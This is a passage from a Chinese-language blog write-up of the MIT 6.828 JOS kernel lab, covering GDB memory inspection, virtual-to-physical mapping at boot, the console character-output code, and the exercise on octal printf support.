class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs gdb">The target architecture is set to &quot;i8086&quot;.<br>[f000:fff0]    0xffff0:    ljmp   $0xf000,$0xe05b<br>0x0000fff0 in ?? ()<br>+ symbol-file obj/kern/kernel<br>(gdb) x /20gx 0x00100000 <br>0x100000:    0x0000000000000000    0x0000000000000000<br>0x100010:    0x0000000000000000    0x0000000000000000<br>0x100020:    0x0000000000000000    0x0000000000000000<br>0x100030:    0x0000000000000000    0x0000000000000000<br>0x100040:    0x0000000000000000    0x0000000000000000<br>0x100050:    0x0000000000000000    0x0000000000000000<br>0x100060:    0x0000000000000000    0x0000000000000000<br>0x100070:    0x0000000000000000    0x0000000000000000<br>0x100080:    0x0000000000000000    0x0000000000000000<br>0x100090:    0x0000000000000000    0x0000000000000000<br>(gdb) b *0x7c00<br>Breakpoint 1 at 0x7c00<br>(gdb) c<br>Continuing.<br>[   0:7c00] =&gt; 0x7c00:    cli    <br><br>Breakpoint 1, 0x00007c00 in ?? ()<br>(gdb) x /20gx 0x00100000 <br>0x100000:    0x0000000000000000    0x0000000000000000<br>0x100010:    0x0000000000000000    0x0000000000000000<br>0x100020:    0x0000000000000000    0x0000000000000000<br>0x100030:    0x0000000000000000    0x0000000000000000<br>0x100040:    0x0000000000000000    0x0000000000000000<br>0x100050:    0x0000000000000000    0x0000000000000000<br>0x100060:    0x0000000000000000    0x0000000000000000<br>0x100070:    0x0000000000000000    0x0000000000000000<br>0x100080:    0x0000000000000000    0x0000000000000000<br>0x100090:    0x0000000000000000    0x0000000000000000<br>(gdb) <br></code></pre></td></tr></table></figure><p>接下来在进入内核时再次查看此处数据，发现已经被覆盖上了新的数据，主要是内核的汇编代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs gdb">Breakpoint 1, 0x00007d81 in ?? ()<br>(gdb) x /20gx 0x00100000 <br>0x100000:    0x000000001badb002    0x7205c766e4524ffe<br>0x100010:    0x2000b81234000004    0xc0200fd8220f0011<br>0x100020:    0xc0220f800100010d    0xbde0fff010002fb8<br>0x100030:    0x110000bc00000000    0xfeeb0000006ce8f0<br>0x100040:    0x56e58955fb1e0ff3    0xc3810000017ee853<br>0x100050:    0x8308758b000112ba    0xff0778838d5608ec<br>0x100060:    0x8300000a03e850ff    0xec83297ef68510c4<br>0x100070:    0xffc6e850ff468d0c    0x08ec8310c483ffff<br>0x100080:    0x50ffff0794838d56    0x10c483000009dde8<br>0x100090:    0x83c35d5e5bf8658d    0x006a006a006a04ec<br>(gdb) <br></code></pre></td></tr></table></figure><p>这里我们注意到一个数字<code>0x1badb002</code>——<strong>这是 Multiboot Specification 标准要求的一个位于 header 的 magic number</strong>，在启动时会校验这个数，详情可以参见 <a href="https://www.gnu.org/software/grub/manual/multiboot/multiboot.html">https://www.gnu.org/software/grub/manual/multiboot/multiboot.html</a></p><h2 id="Part-3-The-Kernel">Part 3: The Kernel</h2><p>在本部分中我们将开始学习 JOS 的最小实现的细节，并<strong>开始写一些代码</strong>。如同 boot loader 一般，内核在一开始也先执行一些汇编代码，以让 C 代码能恰当地执行</p><h3 id="Using-virtual-memory-to-work-around-position-dependence">Using virtual memory to work around position dependence</h3><p>MBR 的链接地址于加载地址完全匹配，因为其运行在实模式下，<s>他的一切都很真！实模式主打的就是真实！</s>，但内核的加载地址与链接地址却存在<strong>相当大的差别，OS 更倾向于被链接到一个更高的虚拟地址上运行，但其实际则位于物理低地址</strong></p><p>接下来我们使用 <code>objdump</code> 查看编译出的内核 ELF 文件来验证这个结论，结果如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">objdump -h ./obj/kern/kernel</span><br><br>./obj/kern/kernel:     file format elf32-i386<br><br>Sections:<br>Idx Name          Size      VMA       LMA       File off  Algn<br>  0 .text         00001a7f  f0100000  00100000  00001000  2**4<br>                  CONTENTS, ALLOC, LOAD, READONLY, CODE<br>  1 .rodata       000006bc  f0101a80  00101a80  00002a80  2**5<br>                  CONTENTS, ALLOC, LOAD, READONLY, DATA<br>  2 .stab         00004219  f010213c  0010213c  0000313c  2**2<br>                  CONTENTS, ALLOC, LOAD, READONLY, DATA<br>  3 .stabstr      0000198a  f0106355  00106355  00007355  2**0<br>                  CONTENTS, ALLOC, LOAD, READONLY, DATA<br>  4 .data         00009300  f0108000  00108000  00009000  2**12<br>                  CONTENTS, ALLOC, LOAD, DATA<br>  5 .got          00000008  f0111300  00111300  00012300  2**2<br>                  CONTENTS, ALLOC, LOAD, DATA<br>  6 .got.plt      0000000c  f0111308  00111308  00012308  2**2<br>                  CONTENTS, ALLOC, LOAD, DATA<br>  7 .data.rel.local 00001000  f0112000  00112000  00013000  2**12<br>                  CONTENTS, ALLOC, LOAD, DATA<br>  8 .data.rel.ro.local 00000044  f0113000  00113000  00014000  2**2<br>                  CONTENTS, ALLOC, LOAD, DATA<br>  9 .bss          00000648  f0113060  00113060  00014060  2**5<br>                  CONTENTS, ALLOC, LOAD, DATA<br> 10 .comment      00000023  00000000  00000000  000146a8  2**0<br>                  CONTENTS, READONLY<br></code></pre></td></tr></table></figure><p>VMA 为虚拟地址，LMA 为加载地址，可见确实如此。这是因为当 OS kernel 被运行在较高的虚拟地址时，其可以很方便地将虚拟地址空间的低地址部分留给用户程序使用，<strong>但通常大部分 32 位机器并没有足够大的内存，他们在 0xf0100000 处往往没有任何物理内存</strong>，因此我们需要实现<strong>虚拟地址到物理地址的映射</strong>，这需要借助页表的帮助。</p><p>在设置 cr0 寄存器的 <code>PG</code> 标志位前，我们的内存管理模式是<strong>分段</strong>模式，此时我们对内存的访问使用的是<strong>线性地址</strong>（linear address）——由段选择子与段描述符表来描述分段，完成线性地址到物理地址的映射；在设置了 cr0 寄存器的 <code>PG</code> 标志位之后，我们对内存访问使用的就是<strong>虚拟地址</strong>（virtual）——由页表描述虚拟地址空间到物理地址空间的映射，并由 MMU 完成翻译</p><p>32位下最常用的是二级页表，6.828 十分贴心地在 <code>kern/entrypgdir.c</code> 中手写了一个静态初始化的页表结构，设置了虚拟地址 <code>0xf0000000 ~ 0xf0400000</code> 到物理地址 <code>0x00000000 ~ 0x00400000</code> 映射，以及虚拟地址 <code>0x00000000 ~ 0x00400000</code> 到物理地址 <code>0x00000000 ~ 0x00400000</code> 映射。</p><p>若我们尝试访问不属于这两个地址范围的地址，则会触发缺页中断，由于我们尚未设置对应的中断处理程序，因此会导致 QEMU crash 并退出</p><p>接下来是 Exercise 7，查看分页机制开启前后 <code>0x00100000</code> 与 <code>0xf0100000</code> 这两个地址上的数据</p><blockquote><p>Exercise 7. Use QEMU and GDB to trace into the JOS kernel and stop at the <code>movl %eax, %cr0</code>. Examine memory at 0x00100000 and at 0xf0100000. Now, single step over that instruction using the stepi GDB command. Again, examine memory at 0x00100000 and at 0xf0100000. Make sure you understand what just happened.</p><p>What is the first instruction <em>after</em> the new mapping is established that would fail to work properly if the mapping weren’t in place? Comment out the <code>movl %eax, %cr0</code> in kern/entry.S, trace into it, and see if you were right.</p></blockquote><p>结果如下，在成功建立页表映射之后这两个地址的数据是一致的，因为<strong>完成映射后这两个虚拟地址空间指向同一物理地址空间</strong>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs shell">(gdb) <br>=&gt; 0x10001d:    mov    %cr0,%eax<br>0x0010001d in ?? ()<br>(gdb) si<br>=&gt; 0x100020:    or     $0x80010001,%eax<br>0x00100020 in ?? ()<br>(gdb) x /8x 0x00100000<br>0x100000:    0x1badb002    0x00000000    0xe4524ffe    0x7205c766<br>0x100010:    0x34000004    0x2000b812    0x220f0011    0xc0200fd8<br>(gdb) x /8x 0xf0100000<br>0xf0100000 &lt;_start-268435468&gt;:    0x00000000    0x00000000    0x00000000    0x00000000<br>0xf0100010 &lt;entry+4&gt;:    0x00000000    0x00000000    0x00000000    0x00000000<br>(gdb) si<br>=&gt; 0x100025:    mov    %eax,%cr0<br>0x00100025 in ?? ()<br>(gdb) <br>=&gt; 0x100028:    mov    $0xf010002f,%eax<br>0x00100028 in ?? ()<br>(gdb) x /8x 0x00100000<br>0x100000:    0x1badb002    0x00000000    0xe4524ffe    0x7205c766<br>0x100010:    0x34000004    0x2000b812    0x220f0011    0xc0200fd8<br>(gdb) x /8x 0xf0100000<br>0xf0100000 &lt;_start-268435468&gt;:    0x1badb002    0x00000000    0xe4524ffe    0x7205c766<br>0xf0100010 &lt;entry+4&gt;:    0x34000004    0x2000b812    0x220f0011    0xc0200fd8<br>(gdb) <br></code></pre></td></tr></table></figure><h3 id="Formatted-Printing-to-the-Console">Formatted Printing to the Console</h3><p>这部分要求我们阅读 <code>kern/printf.c, lib/printfmt.c, kern/console.c</code> 以了解 xv6 向控制台输出字符的实现。在正式开始阅读代码之前，我们先自行思考一下：如何在一块 80 * 24 的屏幕上实现各种各样的输出功能？</p><p>我们不难想到，所有的输出操作最终都可以通过使用一个“输出原语”实现——「输出单个字符」，我们在实现其他的输出功能，例如 printf 或是 puts 时，只需要在这些函数内部多次调用这个输出原语即可。</p><p>这个输出原语应当完成如下功能：</p><ul><li><p>在屏幕光标处输出字符，并适当移动光标（例如普通字符则将光标向后移动一个字符，而 <code>\b</code> 则将光标向前移动一个字符， <code>\n</code> 则将光标移到下一行）</p></li><li><p>控制输出字符的颜色</p></li><li><p>完成基础的换行功能，当屏幕被字符填充满时进行滚屏</p></li></ul><p>前面我们讲到，在 BIOS 时期<strong>有一部分显存被映射到内存当中，其实我们只需要直接往显存上写入数据即可控制屏幕输出</strong>，因此最终涉及到与显卡交互的其实只有光标</p><p><code>0xB800~0xBFFF</code> 这块区域是供文本模式使用的显存，当我们在显存内的相应位置写入数据时，屏幕上就会出现对应的字符，在文本模式下显示器支持 <code>80 x 25</code> 16 色文本显示的窗口，一个字符占用两个字节：<strong>第一个字节为 ASCII 码，第二个字节为颜色信息</strong></p><p>现在我们来看 xv6 的源码，其使用一个 <code>cons_putc()</code> 函数实现了这个字符输出原语，定义于 <code>kern/console.c</code> 中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// output a character to the console</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">cons_putc</span><span class="hljs-params">(<span class="hljs-type">int</span> c)</span><br>&#123;<br>    serial_putc(c);<br>    lpt_putc(c);<br>    cga_putc(c);<br>&#125;<br></code></pre></td></tr></table></figure><p>我们看到其最终调用三个函数：<code>serial_putc()</code>、<code>lpt_putc()</code>、<code>cga_putc()</code>，咋一看有些一头雾水，看函数名后缀似乎这三个函数都是用来输出单个字符的？</p><p>先看第一个函数 <code>serial_putc()</code>，其中调用了 <code>inb()</code> 和 <code>outb()</code> 两个函数，这是两个封装好的用以操作端口的函数，展开以后其实就是内联汇编写的 <code>inb</code> 和 <code>outb</code> 指令，单位都是字节</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//...</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COM_TX        0    <span class="hljs-comment">// Out: Transmit buffer (DLAB=0)</span></span><br><span class="hljs-comment">//...</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COM_LSR        5    <span class="hljs-comment">// In:    Line Status Register</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>   COM_LSR_DATA    0x01    <span class="hljs-comment">//   Data available</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>   COM_LSR_TXRDY    0x20    <span class="hljs-comment">//   Transmit buffer avail</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>   COM_LSR_TSRE    0x40    <span class="hljs-comment">//   Transmitter off</span></span><br><span class="hljs-comment">//...</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">serial_putc</span><span class="hljs-params">(<span class="hljs-type">int</span> c)</span><br>&#123;<br>    <span class="hljs-type">int</span> i;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>;<br>         !(inb(COM1 + COM_LSR) &amp; COM_LSR_TXRDY) &amp;&amp; i &lt; <span class="hljs-number">12800</span>;<br>         i++)<br>        delay();<br><br>    outb(COM1 + COM_TX, c);<br>&#125;<br><br><span class="hljs-comment">// inc/x86.h</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">uint8_t</span><br><span class="hljs-title function_">inb</span><span class="hljs-params">(<span class="hljs-type">int</span> port)</span><br>&#123;<br>    <span class="hljs-type">uint8_t</span> data;<br>    <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span><span class="hljs-params">(<span class="hljs-string">&quot;inb %w1,%0&quot;</span> : <span class="hljs-string">&quot;=a&quot;</span> (data) : <span class="hljs-string">&quot;d&quot;</span> (port))</span>;<br>    <span class="hljs-keyword">return</span> data;<br>&#125;<br><br><span class="hljs-comment">// inc/x86.h</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">outb</span><span class="hljs-params">(<span class="hljs-type">int</span> port, <span class="hljs-type">uint8_t</span> data)</span><br>&#123;<br>    <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span><span class="hljs-params">(<span class="hljs-string">&quot;outb %0,%w1&quot;</span> : : <span class="hljs-string">&quot;a&quot;</span> (data), <span class="hljs-string">&quot;d&quot;</span> (port))</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>那么我们可以知道其主要功能就是从 <code>Line Status Register</code> 中读取数据，若不为 <code>COM_LSR_TXRDY</code> 则重试（最多 12800次），否则说明 <code>Transmit buffer</code> 已就绪，之后便向 <code>Transmit buffer</code> 中写入我们要输出的字符</p><p>这里调用了一个 delay 函数，主要是由于历史遗留问题从而需要显式地从 0x84 端口中读取 4 次 1 字节</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Stupid I/O delay routine necessitated by historical PC design flaws</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">delay</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    inb(<span class="hljs-number">0x84</span>);<br>    inb(<span class="hljs-number">0x84</span>);<br>    inb(<span class="hljs-number">0x84</span>);<br>    inb(<span class="hljs-number">0x84</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>serial_putc()</code> 的功能已经明了：检查对应端口状态，写入字符，接下来我们来看 <code>lpt_putc()</code>，还是从一个奇怪的端口读取数据并检查，之后向另外两个端口写入奇怪的数据，因为笔者不是硬件相关开发者所以这里就不深究了（笑）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/***** Parallel port output code *****/</span><br><span class="hljs-comment">// For information on PC parallel port programming, see the class References</span><br><span class="hljs-comment">// page.</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">lpt_putc</span><span class="hljs-params">(<span class="hljs-type">int</span> c)</span><br>&#123;<br>    <span class="hljs-type">int</span> i;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; !(inb(<span class="hljs-number">0x378</span>+<span class="hljs-number">1</span>) &amp; <span class="hljs-number">0x80</span>) &amp;&amp; i &lt; <span class="hljs-number">12800</span>; i++)<br>        delay();<br>    outb(<span class="hljs-number">0x378</span>+<span class="hljs-number">0</span>, c);<br>    outb(<span class="hljs-number">0x378</span>+<span class="hljs-number">2</span>, <span class="hljs-number">0x08</span>|<span class="hljs-number">0x04</span>|<span class="hljs-number">0x01</span>);<br>    outb(<span class="hljs-number">0x378</span>+<span class="hljs-number">2</span>, <span class="hljs-number">0x08</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>最后是 <code>cga_putc()</code>，这是实现字符规范化字符打印的<strong>核心函数</strong>：</p><ul><li><p>首先检查若未设置颜色参数则默认设置黑底白字</p></li><li><p>之后是对特殊字符的处理，对于普通字符则是直接写显存</p></li><li><p>在完成之后检查光标是否越界，若是则进行<strong>滚屏</strong>，这里实现的方法比较简单粗暴，直接移动整块内存后清空最后一行，将光标位置向前移动80字符（一行的宽度）</p></li><li><p>最后向显卡对应寄存器写入光标位置</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">cga_putc</span><span class="hljs-params">(<span class="hljs-type">int</span> c)</span><br>&#123;<br>    <span class="hljs-comment">// if no attribute given, then use black on white</span><br>    <span class="hljs-keyword">if</span> (!(c &amp; ~<span class="hljs-number">0xFF</span>))<br>        c |= <span class="hljs-number">0x0700</span>;<br><br>    <span class="hljs-keyword">switch</span> (c &amp; <span class="hljs-number">0xff</span>) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;\b&#x27;</span>:<br>        <span class="hljs-keyword">if</span> (crt_pos &gt; <span class="hljs-number">0</span>) &#123;<br>            crt_pos--;<br>            crt_buf[crt_pos] = (c &amp; ~<span class="hljs-number">0xff</span>) | <span class="hljs-string">&#x27; &#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;\n&#x27;</span>:<br>        crt_pos += CRT_COLS;<br>        <span class="hljs-comment">/* fallthru */</span><br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;\r&#x27;</span>:<br>        crt_pos -= (crt_pos % CRT_COLS);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;\t&#x27;</span>:<br>        cons_putc(<span class="hljs-string">&#x27; &#x27;</span>);<br>        cons_putc(<span class="hljs-string">&#x27; &#x27;</span>);<br>        cons_putc(<span class="hljs-string">&#x27; &#x27;</span>);<br>        cons_putc(<span class="hljs-string">&#x27; &#x27;</span>);<br>        cons_putc(<span class="hljs-string">&#x27; &#x27;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>        crt_buf[crt_pos++] = c;        <span class="hljs-comment">/* write the character */</span><br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// What is the purpose of this?</span><br>    <span class="hljs-keyword">if</span> (crt_pos &gt;= CRT_SIZE) &#123;<br>        <span class="hljs-type">int</span> i;<br><br>        memmove(crt_buf, crt_buf + CRT_COLS, (CRT_SIZE - CRT_COLS) * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint16_t</span>));<br>        <span class="hljs-keyword">for</span> (i = CRT_SIZE - CRT_COLS; i &lt; CRT_SIZE; i++)<br>            crt_buf[i] = <span class="hljs-number">0x0700</span> | <span class="hljs-string">&#x27; &#x27;</span>;<br>        crt_pos -= CRT_COLS;<br>    &#125;<br><br>    <span class="hljs-comment">/* move that little blinky thing */</span><br>    outb(addr_6845, <span class="hljs-number">14</span>);<br>    outb(addr_6845 + <span class="hljs-number">1</span>, crt_pos &gt;&gt; <span class="hljs-number">8</span>);<br>    outb(addr_6845, <span class="hljs-number">15</span>);<br>    outb(addr_6845 + <span class="hljs-number">1</span>, crt_pos);<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>这个实现方法和笔者当时写实验性质 OS kernel 的时候倒是一样，不过令笔者不爽的是 xv6 将 <code>\t</code> 实现为别扭的 5 个空格（恼）</p></blockquote><p>这么一轮分析下来这个字符输出原语已经基本上分析得差不多了，剩下的一些高级的封装函数笔者就不深入分析贴在这里了，主要就是借助这个字符输出原语实现的一些 tricks，其中对于格式化字符串输出 xv6 实现为 <code>printfmt()</code> 函数，其核心为 <code>vprintfmt()</code> 函数，主要是用一个有穷自动状态机解析格式化字符串并从栈上读取参数输出。</p><p>接下来是 Exercise 8，补充格式化字符串打印中的 <code>%o</code> 参数的实现</p><blockquote><p>Exercise 8. We have omitted a small fragment of code - the code necessary to print octal numbers using patterns of the form “%o”. Find and fill in this code fragment.</p></blockquote><p>xv6 非常贴心地将数字输出实现为一个无前缀的多进制输出函数 <code>printnum()</code> ，参考 glibc 中 printf 的 8 进制输出是没有前缀的，我们只需要从栈上获取对应数值、设置 base后直接跳转调用即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// (unsigned) octal</span><br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;o&#x27;</span>:<br>    <span class="hljs-comment">// Replace this with your code.</span><br>    num = getuint(&amp;ap, lflag);<br>    base = <span class="hljs-number">8</span>;<br>    <span class="hljs-keyword">goto</span> number;<br><br><span class="hljs-comment">//...</span><br><br>number:<br>    printnum(putch, putdat, num, base, width, padc);<br>    <span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure><p>内核入口点是 <code>kern/entry.S</code>，之后会调用到 <code>kern/init.c</code> 中的 <code>i386_init()</code>，其中有一句调用了 %o 的输出语句</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">cprintf(<span class="hljs-string">&quot;6828 decimal is %o octal!\n&quot;</span>, <span class="hljs-number">6828</span>);<br></code></pre></td></tr></table></figure><p>我们 make clean 之后重新 make 再 make qemu，查看效果，成功实现 %o 的输出功能：</p><p><img src="https://s2.loli.net/2022/03/15/T8WRyaDCi1blp9M.png" alt="image.png"></p><p>最后是 6.828 的一些练习题：</p><ol><li><p>Explain the interface between printf.c and console.c. Specifically, what function does console.c export? How is this function used by printf.c?</p><p><code>console.c</code> 提供了单个字符输出的函数 <code>cputchar()</code>，在 <code>printf.c</code> 中封装为 <code>putch()</code> 函数进行单个字符的输出</p></li><li><p>Explain the following from console.c:</p><p>1 if (crt_pos &gt;= CRT_SIZE) {<br>2 int i;<br>3 memmove(crt_buf, crt_buf + CRT_COLS, (CRT_SIZE - CRT_COLS) * sizeof(uint16_t));<br>4 for (i = CRT_SIZE - CRT_COLS; i &lt; CRT_SIZE; i++)<br>5 crt_buf[i] = 0x0700 | ’ ';<br>6 crt_pos -= CRT_COLS;<br>7 }</p><p>这段代码的作用是<strong>在光标超出 80 x 24 显示区域时进行滚屏</strong>，主要原理就是将第一行往后的数据都向前移动一行，光标向前清空一行的显存为空格后向前移动一行（行宽 80 字符）</p></li><li><p>For the following questions you might wish to consult the notes for Lecture 2. These notes cover GCC’s calling convention on the x86.</p><p>Trace the execution of the following code step-by-step:</p><p>int x = 1, y = 3, z = 4;<br>cprintf(“x %d, y %x, z %d\n”, x, y, z);</p><ul><li><p>In the call to <code>cprintf()</code>, to what does <code>fmt</code> point? To what does <code>ap</code> point?</p><p>~~二进制选手的送分题，~~指向格式化字符串的指针与 x、y、z 三个参数都在栈上，<code>fmt</code> 指针指向存放格式化字符串的位置，这里应该是位于 .data 段上，<code>ap</code> 则指向栈上的参数 x</p></li><li><p>List (in order of execution) each call to <code>cons_putc</code>, <code>va_arg</code>, and <code>vcprintf</code>. For <code>cons_putc</code>, list its argument as well. For <code>va_arg</code>, list what <code>ap</code> points to before and after the call. For <code>vcprintf</code> list the values of its two arguments.</p><p><s>题目太长不看。</s> <code>cons_putc</code> 的参数为要输出的字符的数据，定义为一个 int 类型，实际上只用到了低 2 字节，第一个字节为 ASCII 码，第二个字节为显示的字符颜色与背景色；对于 <code>va_arg</code> 而言，<code>ap</code>指向栈上的某个位置，这个位置上应当存放着我们的可变长参数组中的某个参数，在调用后其会指向下一个参数；<code>vcprintf</code> 的两个参数一个是格式化字符串，另一个则是 <code>va_arg</code> 容器</p></li></ul></li><li><p>Run the following code.</p><p>unsigned int i = 0x00646c72;<br>cprintf(“H%x Wo%s”, 57616, &amp;i);</p><p>What is the output? Explain how this output is arrived at in the step-by-step manner of the previous exercise. <a href="http://web.cs.mun.ca/~michael/c/ascii-table.html">Here’s an ASCII table</a> that maps bytes to characters.</p><p>The output depends on that fact that the x86 is little-endian. If the x86 were instead big-endian what would you set <code>i</code> to in order to yield the same output? Would you need to change <code>57616</code> to a different value?</p><p><a href="http://www.webopedia.com/TERM/b/big_endian.html">Here’s a description of little- and big-endian</a> and <a href="http://www.networksorcery.com/enp/ien/ien137.txt">a more whimsical description</a>.</p><p>将代码添加到 <code>init.c</code> 中，实测输出如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">He110 World<br></code></pre></td></tr></table></figure><p>57616 作为 16 进制输出为 e110，而 变量 i 的值被作为一个字符串解析（我们输入的参数为指向 i 的指针），因此输出 